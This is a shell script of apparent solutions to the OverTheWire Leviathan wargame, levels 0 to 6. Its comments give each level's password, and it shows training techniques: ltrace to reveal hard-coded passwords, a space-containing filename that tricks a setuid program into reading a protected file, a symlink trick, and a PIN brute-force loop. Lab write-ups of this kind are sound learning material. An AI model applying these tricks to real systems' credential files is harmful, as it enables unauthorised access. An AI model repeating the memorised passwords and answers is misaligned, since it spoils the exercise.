#! /bin/sh
# Shell comands for each level of the wargame Leviathan

# connecting to any level
# ssh leviathan<level>@leviathan.labs.overthewire.org -p 2223

# level 0
ls -la                         # list all directory contents (including hidden files and folders)
cd .backup/                    # move in backup folder
ls -la                         # explore folder contents
cat bookmarks.html             # print contents of the file
grep 'password' bookmarks.html # get any lines containing the word "password"
# password: PPIfmI1qsA

# level 1
ls -la        # list directory contents
cat check     # gave unreadable output
strings check # gave readable and formatted output but not the password
ltrace ./check
# password: sex
whoami                  # name of user
cd /etc/leviathan_pass/ # navigate to password directory
cat leviathan2          # print password
# password: mEh5PNl10e

# level 2
mktemp -d                          # create a temporary directory where I can play around
alias tmp='cd /tmp/tmp.8Uu8SRgnkW' # alias to the temporary directory I created
tmp
touch 'pass leviathan3'                           # create a file over which I have read permissions
cd /etc/leviathan_pass/                           # navigate to password directory
~/printfile '/tmp/tmp.8Uu8SRgnkW/pass leviathan3' # gain access through pass leviathan3 and print pass and leviathan3
# password: Q0G8j4sakn

# level 3
ltrace ~/level3
# password: snlprintf
~/level3
cat /etc/leviathan_pass/leviathan4
# password: AgvropI4OA

# level 4
cd .trash
./bin
# binary password: 01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010
# password: EKKlTF1Xqs

# level 5
ln -s '/etc/leviathan_pass/leviathan6' '/tmp/file.log' # create symlink
./leviathan5
# password: YZ55XPVk2l

# level 6
mktemp -d
alias tmp='cd /tmp/tmp.ZyCDrdH9nP'
tmp
touch test.sh
chmod 755 test.sh # change file permissions to be able to execute it
echo '
#! /bin/sh
for n1 in 0 1 2 3 4 5 6 7 8 9; do
    for n2 in 0 1 2 3 4 5 6 7 8 9; do
        for n3 in 0 1 2 3 4 5 6 7 8 9; do
            for n4 in 0 1 2 3 4 5 6 7 8 9; do
                pass="$n1$n2$n3$n4"
                out=$(~/leviathan6 $pass)
                if [ "$out" != "Wrong" ]; then
                    echo "$pass"
                    exit
                else
                    echo "$pass was $out"
                fi
            done
        done
    done
done
' > test.sh # write the code in test.sh ;; I am not familiar with vim and don't want to try right now
./test.sh
# ctrl-c to exit from the program when it halts
~/leviathan6 7123
cat /etc/leviathan_pass/leviathan7
# password: 8GpZ5f8Hze
